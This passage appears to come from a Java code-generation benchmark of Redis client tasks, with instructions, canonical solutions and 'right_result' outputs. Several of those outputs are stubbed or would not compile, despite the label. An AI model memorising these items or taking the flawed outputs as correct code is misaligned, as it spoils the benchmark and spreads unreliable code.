    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPoolWrapper {\n\n    private final String masterName;\n    private final Set<HostAndPort> sentinels;\n    private final GenericObjectPoolConfig<Jedis> poolConfig;\n    private final JedisClientConfig masterConfig;\n    private final JedisClientConfig sentinelConfig;\n    private JedisSentinelPool pool;\n\n    public JedisSentinelPoolWrapper(String masterName, Set<HostAndPort> sentinels,\n                                  GenericObjectPoolConfig<Jedis> poolConfig,\n                                  JedisClientConfig masterConfig,\n                                  JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.poolConfig = poolConfig;\n        this.masterConfig = masterConfig;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public void initializePool() {\n        this.pool = new JedisSentinelPool(masterName, sentinels, poolConfig, masterConfig, sentinelConfig);\n    }\n\n    public Jedis getResource() throws JedisConnectionException {\n        if (pool == null) {\n            throw new JedisConnectionException(\"Pool not initialized\");\n        }\n        return pool.getResource();\n    }\n\n    public void close() {\n        if (pool != null && !pool.isClosed()) {\n            pool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return pool == null || pool.isClosed();\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n\n    private static Set<String> toStrings(Set<HostAndPort> hostAndPorts) {\n        return hostAndPorts.stream().map(HostAndPort::toString).collect(Collectors.toSet());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisSentinelPool;\nimport redis.clients.util.PoolingState;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\npublic class JedisSentinelPoolWrapper {\n    private String masterName;\n    private Set<HostAndPort> sentinels;\n    private GenericObjectPoolConfig<Jedis> poolConfig;\n    private JedisClientConfig masterConfig;\n    private JedisClientConfig sentinelConfig;\n    private JedisSentinelPool pool;\n\n    public JedisSentinelPoolWrapper(String masterName, Set<HostAndPort> sentinels, GenericObjectPoolConfig<Jedis> poolConfig,\n                                   JedisClientConfig masterConfig, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.poolConfig = poolConfig;\n        this.masterConfig = masterConfig;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public void initializePool() {\n        if (pool == null || pool.getState() != PoolingState.OPENED) {\n            pool = new JedisSentinelPool(masterName, sentinels, poolConfig, masterConfig, sentinelConfig);\n        }\n    }\n\n    public Jedis getResource() throws JedisConnectionException {\n        if (pool == null || pool.getState() != PoolingState.OPENED) {\n            throw new JedisConnectionException(\"JedisSentinelPool is not initialized.\");\n        }\n        return pool.getResource();\n    }\n\n    public void close() {\n        if (pool != null && pool.getState() == PoolingState.OPENED) {\n            pool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return pool == null || pool.getState() != PoolingState.OPENED;\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n\n    public static Set<String> toStrings(Set<HostAndPort> hostAndPorts) {\n        return hostAndPorts.stream()\n                .map(hostAndPort -> hostAndPort.getHost() + \":\" + hostAndPort.getPort())\n                .collect(Collectors.toSet());\n    }\n}\n```"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Java class that implements a Redis Sentinel connection pool for managing connections to a Redis master server, with automatic failover handling when the master changes.\n\nClass Description: JedisSentinelPool is a connection pool implementation that maintains connections to a Redis master server discovered through Redis Sentinel. It automatically handles master failover by monitoring Sentinel notifications and reconfiguring the connection pool when the master changes.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- factory: JedisFactory - Factory for creating Jedis instances\n- sentinelClientConfig: JedisClientConfig - Configuration for connecting to Sentinels\n- masterListeners: Collection<MasterListener> - Collection of threads monitoring Sentinel servers\n- currentHostMaster: HostAndPort - Current master server address (volatile)\n- initPoolLock: Lock - Lock for thread-safe pool initialization\n\nMethods:\n- JedisSentinelPool(String, Set<HostAndPort>, JedisFactory, JedisClientConfig) -> void - Constructor that initializes the Sentinel pool with master name, Sentinel addresses, factory, and client config\n- initMaster(HostAndPort) -> void - Initializes or updates the master connection pool\n- initSentinels(Set<HostAndPort>, String) -> HostAndPort - Discovers the current master from Sentinels and starts listeners\n- toHostAndPort(List<String>) -> HostAndPort - Converts Sentinel response to HostAndPort object\n- getResource() -> Jedis - Gets a Jedis resource from the pool (overrides parent method)\n- returnResource(Jedis) -> void - Returns a Jedis resource to the pool (overrides parent method)\n\nNested Class MasterListener:\n- masterName: String - Name of the monitored master\n- host: String - Sentinel host address\n- port: int - Sentinel port number\n- subscribeRetryWaitTimeMillis: long - Retry wait time for subscription\n- j: Jedis - Jedis instance for Sentinel connection\n- running: AtomicBoolean - Flag controlling listener thread\n\nMasterListener Methods:\n- MasterListener(String, String, int) -> void - Constructor for Sentinel listener\n- run() -> void - Main listener thread that monitors Sentinel for master changes\n- shutdown() -> void - Gracefully shuts down the listener thread",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPool extends Pool<Jedis> {\n\n  private static final Logger LOG = LoggerFactory.getLogger(JedisSentinelPool.class);\n  private final JedisFactory factory;\n  private final JedisClientConfig sentinelClientConfig;\n  protected final Collection<MasterListener> masterListeners = new ArrayList<>();\n  private volatile HostAndPort currentHostMaster;\n  private final Lock initPoolLock = new ReentrantLock(true);\n\n  public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels,\n      final JedisFactory factory, final JedisClientConfig sentinelClientConfig) {\n    super(factory);\n    this.factory = factory;\n    this.sentinelClientConfig = sentinelClientConfig;\n    HostAndPort master = initSentinels(sentinels, masterName);\n    initMaster(master);\n  }\n\n  private void initMaster(HostAndPort master) {\n    initPoolLock.lock();\n    try {\n      if (!master.equals(currentHostMaster)) {\n        currentHostMaster = master;\n        factory.setHostAndPort(currentHostMaster);\n        super.clear();\n        LOG.info(\"Created JedisSentinelPool to master at {}\", master);\n      }\n    } finally {\n      initPoolLock.unlock();\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels, final String masterName) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n    LOG.info(\"Trying to find master from available Sentinels...\");\n\n    for (HostAndPort sentinel : sentinels) {\n      LOG.debug(\"Connecting to Sentinel {}\", sentinel);\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n        if (masterAddr == null || masterAddr.size() != 2) {\n          LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}\", masterName, sentinel);\n          continue;\n        }\n        master = toHostAndPort(masterAddr);\n        LOG.debug(\"Found Redis master at {}\", master);\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Cannot get master address from sentinel running @ {}. Reason: {}. Trying next one.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored...\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where is \" + masterName + \" master is running...\");\n      }\n    }\n\n    LOG.info(\"Redis master running at {}, starting Sentinel listeners...\", master);\n    for (HostAndPort sentinel : sentinels) {\n      MasterListener masterListener = new MasterListener(masterName, sentinel.getHost(), sentinel.getPort());\n      masterListener.setDaemon(true);\n      masterListeners.add(masterListener);\n      masterListener.start();\n    }\n    return master;\n  }\n\n  private HostAndPort toHostAndPort(List<String> getMasterAddrByNameResult) {\n    String host = getMasterAddrByNameResult.get(0);\n    int port = Integer.parseInt(getMasterAddrByNameResult.get(1));\n    return new HostAndPort(host, port);\n  }\n\n  @Override\n  public Jedis getResource() {\n    while (true) {\n      Jedis jedis = super.getResource();\n      jedis.setDataSource(this);\n      final HostAndPort master = currentHostMaster;\n      final HostAndPort connection = jedis.getClient().getHostAndPort();\n      if (master.equals(connection)) {\n        return jedis;\n      } else {\n        returnBrokenResource(jedis);\n      }\n    }\n  }\n\n  @Override\n  public void returnResource(final Jedis resource) {\n    if (resource != null) {\n      try {\n        resource.resetState();\n        super.returnResource(resource);\n      } catch (RuntimeException e) {\n        returnBrokenResource(resource);\n        LOG.debug(\"Resource is returned to the pool as broken\", e);\n      }\n    }\n  }\n\n  protected class MasterListener extends Thread {\n    protected String masterName;\n    protected String host;\n    protected int port;\n    protected long subscribeRetryWaitTimeMillis = 5000;\n    protected volatile Jedis j;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public MasterListener(String masterName, String host, int port) {\n      super(String.format(\"MasterListener-%s-[%s:%d]\", masterName, host, port));\n      this.masterName = masterName;\n      this.host = host;\n      this.port = port;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n      while (running.get()) {\n        try {\n          if (!running.get()) break;\n          final HostAndPort hostPort = new HostAndPort(host, port);\n          j = new Jedis(hostPort, sentinelClientConfig);\n          List<String> masterAddr = j.sentinelGetMasterAddrByName(masterName);\n          if (masterAddr == null || masterAddr.size() != 2) {\n            LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}.\", masterName, hostPort);\n          } else {\n            initMaster(toHostAndPort(masterAddr));\n          }\n          j.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              LOG.debug(\"Sentinel {} published: {}.\", hostPort, message);\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3) {\n                if (masterName.equals(switchMasterMsg[0])) {\n                  initMaster(toHostAndPort(Arrays.asList(switchMasterMsg[3], switchMasterMsg[4])));\n                } else {\n                  LOG.debug(\"Ignoring message on +switch-master for master name {}, our master name is {}\",\n                      switchMasterMsg[0], masterName);\n                }\n              } else {\n                LOG.error(\"Invalid message received on Sentinel {} on channel +switch-master: {}\",\n                    hostPort, message);\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            LOG.error(\"Lost connection to Sentinel at {}:{}. Sleeping 5000ms and retrying.\", host, port, e);\n            try {\n              Thread.sleep(subscribeRetryWaitTimeMillis);\n            } catch (InterruptedException e1) {\n              LOG.error(\"Sleep interrupted: \", e1);\n            }\n          } else {\n            LOG.debug(\"Unsubscribing from Sentinel at {}:{}\", host, port);\n          }\n        } finally {\n          if (j != null) {\n            j.close();\n          }\n        }\n      }\n    }\n\n    public void shutdown() {\n      try {\n        LOG.debug(\"Shutting down listener on {}:{}\", host, port);\n        running.set(false);\n        if (j != null) {\n          j.close();\n        }\n      } catch (RuntimeException e) {\n        LOG.error(\"Caught exception while shutting down: \", e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisFactory;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.Collection;\nimport java.util.Set;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.List;\n\npublic class JedisSentinelPool extends JedisPool {\n    private static final Logger LOG = LoggerFactory.getLogger(JedisSentinelPool.class);\n    private final JedisFactory factory;\n    private final JedisClientConfig sentinelClientConfig;\n    private final Collection<MasterListener> masterListeners;\n    private volatile HostAndPort currentHostMaster;\n    private final Lock initPoolLock = new ReentrantLock();\n\n    public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels, JedisFactory factory, JedisClientConfig sentinelClientConfig) {\n        super(sentinels, masterName, sentinelClientConfig);\n        this.factory = factory;\n        this.sentinelClientConfig = sentinelClientConfig;\n        this.masterListeners = Set.of(new MasterListener(masterName, \"localhost\", 26379));\n        initSentinels(sentinels, masterName);\n    }\n\n    private void initMaster(HostAndPort master) {\n        // Implementation to initialize or update the master connection pool\n    }\n\n    private HostAndPort initSentinels(Set<HostAndPort> sentinels, String masterName) {\n        // Implementation to discover the current master from Sentinels and start listeners\n        return null;\n    }\n\n    private HostAndPort toHostAndPort(List<String> sentinelResponse) {\n        // Implementation to convert Sentinel response to HostAndPort object\n        return null;\n    }\n\n    @Override\n    public Jedis getResource() {\n        // Override to get a Jedis resource from the pool\n        return super.getResource();\n    }\n\n    @Override\n    public void returnResource(Jedis jedis) {\n        // Override to return a Jedis resource to the pool\n        super.returnResource(jedis);\n    }\n\n    private static class MasterListener implements Runnable {\n        private final String masterName;\n        private final String host;\n        private final int port;\n        private final long subscribeRetryWaitTimeMillis;\n        private final Jedis j;\n        private final AtomicBoolean running = new AtomicBoolean(true);\n\n        public MasterListener(String masterName, String host, int port) {\n            this.masterName = masterName;\n            this.host = host;\n            this.port = port;\n            this.subscribeRetryWaitTimeMillis = 1000L;\n            this.j = new Jedis(host, port, sentinelClientConfig);\n        }\n\n        @Override\n        public void run() {\n            while (running.get()) {\n                try {\n                    // Monitor Sentinel for master changes\n                } catch (JedisConnectionException e) {\n                    LOG.error(\"Error subscribing to Sentinel for master changes\", e);\n                    try {\n                        Thread.sleep(subscribeRetryWaitTimeMillis);\n                    } catch (InterruptedException ie) {\n                        Thread.currentThread().interrupt();\n                    }\n                }\n            }\n        }\n\n        public void shutdown() {\n            running.set(false);\n            j.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 334,
    "Instruction": "Task Description: Implement a Redis Pub/Sub manager class in Java that handles publishing and subscribing to Redis channels, including connection management and resource cleanup.\n\nClass Description: RedisPubSubManager is a class that manages Redis publish/subscribe operations using a connection pool. It provides methods to start subscribers and publishers on a specified channel, and handles connection lifecycle management.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- channelName: String - The name of the channel to publish/subscribe to\n- logger: Logger - Logger instance for logging operations and errors\n\nMethods:\n- RedisPubSubManager(String host, int port, String channelName) -> void - Constructor that initializes the Redis connection pool with the specified host, port, and channel name\n- startSubscriber(Subscriber subscriber) -> void - Starts a subscriber thread that listens to messages on the configured channel using the provided subscriber implementation\n- startPublisher() -> void - Starts a publisher that can send messages to the configured channel\n- shutdown() -> void - Closes the connection pool and releases all resources",
    "Canonical_solution": "import com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisPubSubManager {\n\n    private static final Logger logger = LoggerFactory.getLogger(RedisPubSubManager.class);\n    private final JedisPool jedisPool;\n    private final String channelName;\n\n    public RedisPubSubManager(String host, int port, String channelName) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, 0);\n        this.channelName = channelName;\n    }\n\n    public void startSubscriber(Subscriber subscriber) {\n        Jedis subscriberJedis = jedisPool.getResource();\n        new Thread(() -> {\n            try {\n                logger.info(\"Subscribing to \\\"\" + channelName + \"\\\". This thread will be blocked.\");\n                subscriberJedis.subscribe(subscriber, channelName);\n                logger.info(\"Subscription ended.\");\n            } catch (Exception e) {\n                logger.error(\"Subscribing failed.\", e);\n            } finally {\n                subscriberJedis.close();\n            }\n        }).start();\n    }\n\n    public void startPublisher() {\n        Jedis publisherJedis = jedisPool.getResource();\n        new Publisher(publisherJedis, channelName).start();\n        publisherJedis.close();\n    }\n\n    public void shutdown() {\n        jedisPool.destroy();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class RedisPubSubManager {\n    private JedisPool jedisPool;\n    private String channelName;\n    private ExecutorService executorService;\n    private static final Logger logger = LoggerFactory.getLogger(RedisPubSubManager.class);\n\n    public RedisPubSubManager(String host, int port, String channelName) {\n        this.channelName = channelName;\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port);\n        this.executorService = Executors.newCachedThreadPool();\n    }\n\n    public void startSubscriber(Subscriber subscriber) {\n        executorService.submit(() -> {\n            try (Jedis jedis = jedisPool.getResource()) {\n                jedis.subscribe(new SubscriberAdapter(subscriber), channelName);\n            } catch (Exception e) {\n                logger.error(\"Error starting subscriber\", e);\n            }\n        });\n    }\n\n    public void startPublisher() {\n        executorService.submit(() -> {\n            try (Jedis jedis = jedisPool.getResource()) {\n                Scanner scanner = new Scanner(System.in);\n                while (true) {\n                    System.out.println(\"Enter message to publish:\");\n                    String message = scanner.nextLine();\n                    jedis.publish(channelName, message);\n                }\n            } catch (Exception e) {\n                logger.error(\"Error starting publisher\", e);\n            }\n        });\n    }\n\n    public void shutdown() {\n        executorService.shutdownNow();\n        try {\n            if (!executorService.awaitTermination(60, TimeUnit.SECONDS)) {\n                executorService.shutdownNow();\n            }\n        } catch (InterruptedException e) {\n            executorService.shutdownNow();\n        }\n        jedisPool.close();\n    }\n}\n```"
  },
  {
    "Task_id": 336,
    "Instruction": "Task Description: Create a Java utility class for interacting with Redis using sharded connections, providing thread-safe initialization, connection pooling, and basic CRUD operations for both string and object values.\n\nClass Description: JedisUtil is a utility class that manages Redis connections using Jedis sharding with connection pooling. It provides methods for storing and retrieving both string and serialized object values with expiration support.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging messages\n- address: String - Comma-separated Redis server addresses\n- shardedJedisPool: ShardedJedisPool - Pool of sharded Redis connections\n- INSTANCE_INIT_LOCL: ReentrantLock - Lock for thread-safe initialization\n\nMethods:\n- init(String address) -> void - Initializes the Redis connection pool with the given addresses\n- getInstance() -> ShardedJedis - Returns a sharded Redis connection instance (thread-safe initialization)\n- close() -> void - Closes the Redis connection pool and releases resources\n- serialize(Object object) -> byte[] - Serializes a Java object to byte array\n- unserialize(byte[] bytes) -> Object - Deserializes a byte array back to a Java object\n- setStringValue(String key, String value, int seconds) -> String - Stores a string value in Redis with expiration time\n- setObjectValue(String key, Object obj, int seconds) -> String - Stores a serialized object in Redis with expiration time\n- getStringValue(String key) -> String - Retrieves a string value from Redis\n- getObjectValue(String key) -> Object - Retrieves and deserializes an object from Redis",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.JedisShardInfo;\nimport redis.clients.jedis.ShardedJedis;\nimport redis.clients.jedis.ShardedJedisPool;\n\nimport java.io.*;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class JedisUtil {\n    private static Logger logger = LoggerFactory.getLogger(JedisUtil.class);\n    private static String address;\n    private static ShardedJedisPool shardedJedisPool;\n    private static ReentrantLock INSTANCE_INIT_LOCL = new ReentrantLock(false);\n\n    public static void init(String address) {\n        JedisUtil.address = address;\n        getInstance();\n    }\n\n    private static ShardedJedis getInstance() {\n        if (shardedJedisPool == null) {\n            try {\n                if (INSTANCE_INIT_LOCL.tryLock(2, TimeUnit.SECONDS)) {\n                    try {\n                        if (shardedJedisPool == null) {\n                            JedisPoolConfig config = new JedisPoolConfig();\n                            config.setMaxTotal(200);\n                            config.setMaxIdle(50);\n                            config.setMinIdle(8);\n                            config.setMaxWaitMillis(10000);\n                            config.setTestOnBorrow(true);\n                            config.setTestOnReturn(false);\n                            config.setTestWhileIdle(true);\n                            config.setTimeBetweenEvictionRunsMillis(30000);\n                            config.setNumTestsPerEvictionRun(10);\n                            config.setMinEvictableIdleTimeMillis(60000);\n\n                            List<JedisShardInfo> jedisShardInfos = new LinkedList<JedisShardInfo>();\n                            String[] addressArr = address.split(\",\");\n                            for (int i = 0; i < addressArr.length; i++) {\n                                JedisShardInfo jedisShardInfo = new JedisShardInfo(addressArr[i]);\n                                jedisShardInfos.add(jedisShardInfo);\n                            }\n                            shardedJedisPool = new ShardedJedisPool(config, jedisShardInfos);\n                            logger.info(\">>>>>>>>>>> xxl-sso, JedisUtil.ShardedJedisPool init success.\");\n                        }\n                    } finally {\n                        INSTANCE_INIT_LOCL.unlock();\n                    }\n                }\n            } catch (InterruptedException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n\n        if (shardedJedisPool == null) {\n            throw new NullPointerException(\">>>>>>>>>>> xxl-sso, JedisUtil.ShardedJedisPool is null.\");\n        }\n\n        return shardedJedisPool.getResource();\n    }\n\n    public static void close() throws IOException {\n        if(shardedJedisPool != null) {\n            shardedJedisPool.close();\n        }\n    }\n\n    private static byte[] serialize(Object object) {\n        ObjectOutputStream oos = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            baos = new ByteArrayOutputStream();\n            oos = new ObjectOutputStream(baos);\n            oos.writeObject(object);\n            return baos.toByteArray();\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            try {\n                if (oos != null) oos.close();\n                if (baos != null) baos.close();\n            } catch (IOException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n        return null;\n    }\n\n    private static Object unserialize(byte[] bytes) {\n        ByteArrayInputStream bais = null;\n        try {\n            bais = new ByteArrayInputStream(bytes);\n            ObjectInputStream ois = new ObjectInputStream(bais);\n            return ois.readObject();\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            try {\n                if (bais != null) bais.close();\n            } catch (IOException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n        return null;\n    }\n\n    public static String setStringValue(String key, String value, int seconds) {\n        String result = null;\n        ShardedJedis client = getInstance();\n        try {\n            result = client.setex(key, seconds, value);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return result;\n    }\n\n    public static String setObjectValue(String key, Object obj, int seconds) {\n        String result = null;\n        ShardedJedis client = getInstance();\n        try {\n            result = client.setex(key.getBytes(), seconds, serialize(obj));\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return result;\n    }\n\n    public static String getStringValue(String key) {\n        String value = null;\n        ShardedJedis client = getInstance();\n        try {\n            value = client.get(key);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return value;\n    }\n\n    public static Object getObjectValue(String key) {\n        Object obj = null;\n        ShardedJedis client = getInstance();\n        try {\n            byte[] bytes = client.get(key.getBytes());\n            if (bytes != null && bytes.length > 0) {\n                obj = unserialize(bytes);\n            }\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return obj;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.ShardedJedis;\nimport redis.clients.jedis.ShardedJedisPool;\nimport redis.clients.jedis.HostAndPort;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class JedisUtil {\n    private static final Logger logger = LoggerFactory.getLogger(JedisUtil.class);\n    private String address;\n    private ShardedJedisPool shardedJedisPool;\n    private static final ReentrantLock INSTANCE_INIT_LOCK = new ReentrantLock();\n\n    public void init(String address) {\n        this.address = address;\n        List<HostAndPort> shards = Arrays.asList(address.split(\",\"))\n                .stream()\n                .map(host -> new HostAndPort(host.split(\":\")[0], Integer.parseInt(host.split(\":\")[1])))\n                .collect(Collectors.toList());\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.shardedJedisPool = new ShardedJedisPool(poolConfig, shards);\n    }\n\n    public ShardedJedis getInstance() {\n        if (shardedJedisPool == null) {\n            try {\n                INSTANCE_INIT_LOCK.lock();\n                if (shardedJedisPool == null) {\n                    init(\"localhost:6379\");\n                }\n            } finally {\n                INSTANCE_INIT_LOCK.unlock();\n            }\n        }\n        return shardedJedisPool.getResource();\n    }\n\n    public void close() {\n        if (shardedJedisPool != null) {\n            shardedJedisPool.close();\n        }\n    }\n\n    private byte[] serialize(Object object) throws Exception {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(object);\n        oos.close();\n        return baos.toByteArray();\n    }\n\n    private Object unserialize(byte[] bytes) throws Exception {\n        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois = new ObjectInputStream(bais);\n        Object obj = ois.readObject();\n        ois.close();\n        return obj;\n    }\n\n    public String setStringValue(String key, String value, int seconds) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = getInstance();\n            jedis.setex(key, seconds, value);\n            return \"OK\";\n        } catch (Exception e) {\n            logger.error(\"Error setting string value\", e);\n            return \"ERROR\";\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String setObjectValue(String key, Object obj, int seconds) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = getInstance();\n            byte[] data = serialize(obj);\n            jedis.setex(key.getBytes(), seconds, data);\n            return \"OK\";\n        } catch (Exception e) {\n            logger.error(\"Error setting object value\", e);\n            return \"ERROR\";\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String getStringValue(String key) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = getInstance();\n            return jedis.get(key);\n        } catch (Exception e) {\n            logger.error(\"Error getting string value\", e);\n            return null;\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public Object getObjectValue(String key) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = getInstance();\n            byte[] data = jedis.get(key.getBytes());\n            if (data != null) {\n                return unserialize(data);\n            }\n            return null;\n        } catch (Exception e) {\n            logger.error(\"Error getting object value\", e);\n            return null;\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Java class that provides geospatial operations using Redis, including adding locations, querying locations within a radius, calculating distances between locations, and retrieving position coordinates.\n\nClass Description: The RedisGeoOperations class encapsulates Redis geospatial commands using the Lettuce client. It manages Redis connections and provides methods for common geospatial operations.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for connection management\n- redisCommands: RedisCommands<String, String> - Synchronous Redis command interface for executing operations\n\nMethods:\n- RedisGeoOperations(String host, int port) -> void - Constructor that initializes the Redis client with specified host and port\n- addGeoLocation(String key, double longitude, double latitude, String member) -> void - Adds a geospatial member with coordinates to the specified key\n- getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) -> Set<String> - Returns members within given radius of a point\n- getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) -> Double - Calculates distance between two members in specified units\n- getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) -> List<GeoWithin<String>> - Returns members within radius with additional options (like distance or coordinates)\n- getGeoPositions(String key, String... members) -> List<GeoCoordinates> - Returns coordinates for specified members\n- closeConnection() -> void - Properly closes Redis connection and shuts down client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisGeoOperations {\n\n    private RedisClient redisClient;\n    private RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        this.redisClient = RedisClient.create(RedisURI.Builder.redis(host, port).build());\n        this.redisCommands = redisClient.connect().sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoadd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, \n                                                      GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        redisCommands.getStatefulConnection().close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
